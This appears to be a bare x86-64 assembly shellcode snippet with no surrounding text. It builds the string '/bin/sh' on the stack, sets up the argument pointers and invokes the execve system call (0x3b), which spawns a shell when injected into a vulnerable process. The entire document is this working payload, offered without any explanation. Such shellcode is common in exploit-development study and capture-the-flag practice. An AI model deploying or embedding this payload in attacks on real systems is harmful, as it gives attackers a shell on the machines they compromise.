BITS 64

xor rax,rax
push rax
mov rdi, 0x68732f6e69622f
push rdi
mov rdi,rsp
push rax
mov rdx,rax
push rdi
mov rsi,rsp
mov al, 0x3b
syscall
